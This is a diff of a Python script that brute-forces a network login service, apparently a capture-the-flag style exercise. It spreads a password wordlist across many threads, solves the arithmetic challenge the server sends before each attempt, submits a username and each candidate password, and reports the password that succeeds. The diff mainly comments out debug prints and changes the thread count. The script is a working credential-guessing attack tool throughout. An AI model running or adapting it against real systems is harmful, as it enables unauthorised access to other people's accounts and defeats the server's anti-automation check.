@@ -13,32 +13,10 @@ regex = r"(?P<firstNum>(\d)*)\s(?P<op>([\+\-\*\/]))\s(?P<secNum>(\d)*)"
 ops = { "+": operator.add, "-": operator.sub, "*": operator.mul, "/": operator.floordiv }
 pw_find = False
 
-# def create_threads(passwords,thread_num):
-# 	p_len = len(passwords)
-# 	t_len = p_len//thread_num
-# 	split_points = []
-# 	for n in range(thread_num):
-# 		if n == thread_num-1:
-# 			split_points.append((n*t_len,p_len-1))
-# 		else:
-# 			split_points.append((n*t_len,(n+1)*t_len-1))
-
-# 	print(p_len)
-# 	print("=====")
-# 	print(split_points)
-
-
-# 	thread_list = [threading.Thread(target=run_brute_force,
-# 		args=(
-#             passwords[split_point[0] : split_point[1]]
-#         )
-#     ) for split_point in split_points]
-
-# 	return thread_list
 def create_threads(t, passwords):
 	n = len(passwords)
 	x = n // t
-	m = n % t 
+	m = n % t
 	xs = [passwords[i:i+x] for i in range(0, n, x)]
 	if m:
 		xs[t-1:] = [passwords[-m-x:]]
@@ -69,52 +47,51 @@ def brute_force(pw):
 	while re.search(regex,d1) == None:
 		d1 = s.recv(1024)
 
-	print("======data=====")
-	print("|"+d1+"|")
-	print("======end=====")
+	# print("======data=====")
+	# print("|"+d1+"|")
+	# print("======end=====")
 
 	m = re.search(regex,d1)
 	firstNum = int(m.group('firstNum'))
 	secNum = int(m.group('secNum'))
 	op = m.group('op')
 	res = str(ops[op](firstNum,secNum))
-	print("answr is " + res)
+	# print("answr is " + res)
 	s.send(res+"\n")
 	d2 = s.recv(1024)
 	while d2 == "\n":
 		d2 = s.recv(1024)
-	print("d2 is " + d2)
+	# print("d2 is " + d2)
 
 	s.send(username + "\n")
 	d3 = s.recv(1024)
 	while d3 == "\n":
 		d3 = s.recv(1024)
-	print("d3 is " + d3)
+	# print("d3 is " + d3)
 
 	s.send(pw + "\n")
 	d4 = s.recv(1024)
 	while d4 == "\n":
 		d4 = s.recv(1024)
 
-	print("d4 result is " + d4)
+	# print("d4 result is " + d4)
 	s.close()
-	print("++++s closed++++")
+	# print("++++s closed++++")
 	if not "Fail" in d4:
+		print("====================")
 		print("SUCCESS")
 		print("PASSWORD: " + pw)
+		print("====================")
 		return True
 	else:
 		return False
 
 
-
-		
-
 if __name__ == '__main__':
 	file = open(wordlist,"r")
 	passwords = file.readlines()
 
-	thread_list = create_threads(200,passwords)
+	thread_list = create_threads(35,passwords)
 
 	for thread in thread_list:
 		print('[*] Running thread: {}.'.format(thread.getName()))
@@ -123,5 +100,3 @@ if __name__ == '__main__':
 	for thread in thread_list:
 		print('[*] Wating for {} to join.'.format(thread.getName()))
 		thread.join()
-	
-
